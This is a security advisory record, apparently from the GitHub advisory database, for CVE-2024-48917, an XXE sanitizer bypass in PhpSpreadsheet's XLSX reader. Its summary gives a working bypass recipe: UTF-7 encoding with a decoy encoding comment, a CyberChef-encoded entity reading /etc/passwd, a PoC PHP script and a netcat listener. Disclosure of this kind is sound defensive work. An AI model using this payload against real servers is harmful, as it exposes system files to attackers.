advisory_id: GHSA-7cc9-j4mv-vcjp
datasource_id: github_osv_importer_v2/GHSA-7cc9-j4mv-vcjp
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-7cc9-j4mv-vcjp/GHSA-7cc9-j4mv-vcjp.json
aliases:
  - CVE-2024-48917
summary: "XXE in PHPSpreadsheet's XLSX reader\n### Summary\n\nThe [XmlScanner class](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php)\
  \ has a [scan](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72)\
  \ method which should prevent XXE attacks.\n\nHowever, we found another bypass than the previously\
  \ reported `CVE-2024-47873`, the regexes from the [findCharSet](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51)\
  \ method, which is used for determining the current encoding can be bypassed by using a payload\
  \ in the encoding UTF-7, and adding at end of the file a comment with the value `encoding=\"\
  UTF-8\"` with `\"`, which is matched by the first regex, so that `encoding='UTF-7'` with single\
  \ quotes `'` in the XML header is not matched by the second regex: \n\n```\n $patterns = [\n\
  \            '/encoding\\\\s*=\\\\s*\"([^\"]*]?)\"/',\n            \"/encoding\\\\s*=\\\\\
  s*'([^']*?)'/\",\n        ];\n``` \n\nA payload for the `workbook.xml` file can for example\
  \ be created with [CyberChef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-7%20(65000)')&input=Pz4KPCFET0NUWVBFIGZvbyBbCiAgPCFFTEVNRU5UIGZvbyBBTlkgPgogIDwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0%2BCjxmb28%2BJnh4ZTs8L2Zvbz4K).\n\
  If you open an Excel file containing the payload from the link above stored in the `workbook.xml`\
  \ file with PhpSpreadsheet, you will receive an HTTP request on `127.0.0.1:12345`. You can\
  \ test that an HTTP request is created by running the `nc -nlvp 12345` command before opening\
  \ the file containing the payload with PhpSpreadsheet.\n\nTo create the payload you need:\n\
  1. Create a file containing `<?xml version = \"1.0\" encoding='UTF-7'` in an XML file\n2.\
  \ Use the link attached above to create your XXE payload and add it to the XML file. \n3.\
  \ Add `+ADw-+ACE---encoding=\"UTF-8\"--+AD4-` to the end of the XML file, which is matched\
  \ by the first regex. \n\n### PoC\n\n[payload.xlsx](https://github.com/user-attachments/files/17375792/payload.xlsx)\n\
  \n- Create a new folder.\n- Run the `composer require phpoffice/phpspreadsheet` command in\
  \ the new folder.\n- Create an `index.php` file in that folder with the following content:\n\
  ```PHP\n<?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\n\
  use PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType\
  \ = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined\
  \ in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n\
  /**  Advise the Reader that we only want to load cell data  **/\n$reader->setReadDataOnly(true);\n\
  \n$worksheetData = $reader->listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData\
  \ as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"<h4>$sheetName</h4>\"\
  ;\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader->setLoadSheetsOnly($sheetName);\n\
  $spreadsheet = $reader->load($inputFileName);\n\n$worksheet = $spreadsheet->getActiveSheet();\n\
  print_r($worksheet->toArray());\n\n}\n```\n- Run the following command: `php -S 127.0.0.1:8080`\n\
  - Add the [payload.xlsx](https://github.com/user-attachments/files/17375792/payload.xlsx)\
  \ file in the folder and open <https://127.0.0.1:8080> in a browser. You will see an HTTP\
  \ request on netcat <http://127.0.0.1:12345/ext.dtd>.\n\n### Impact\n\nAn attacker can bypass\
  \ the sanitizer and achieve an [XXE attack](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)."
impacted_packages:
  - purl: pkg:composer/phpoffice/phpspreadsheet
    affected_versions: vers:composer/<1.29.4
    fixed_versions: vers:composer/1.29.4
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:composer/phpoffice/phpspreadsheet
    affected_versions: vers:composer/>=2.0.0|<2.1.3
    fixed_versions: vers:composer/2.1.3
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:composer/phpoffice/phpspreadsheet
    affected_versions: vers:composer/>=2.2.0|<2.3.2
    fixed_versions: vers:composer/2.3.2
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:composer/phpoffice/phpspreadsheet
    affected_versions: vers:composer/>=3.3.0|<3.4.0
    fixed_versions: vers:composer/3.4.0
    fixed_in_commits: []
    introduced_in_commits: []
  - purl: pkg:composer/phpoffice/phpexcel
    affected_versions: vers:composer/<=1.8.2
    fixed_versions:
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/11/GHSA-7cc9-j4mv-vcjp/GHSA-7cc9-j4mv-vcjp.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-611
references:
  - url: https://github.com/PHPOffice/PhpSpreadsheet
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php
    reference_type:
    reference_id:
  - url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-7cc9-j4mv-vcjp
    reference_type:
    reference_id:
  - url: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-48917
    reference_type:
    reference_id: CVE-2024-48917
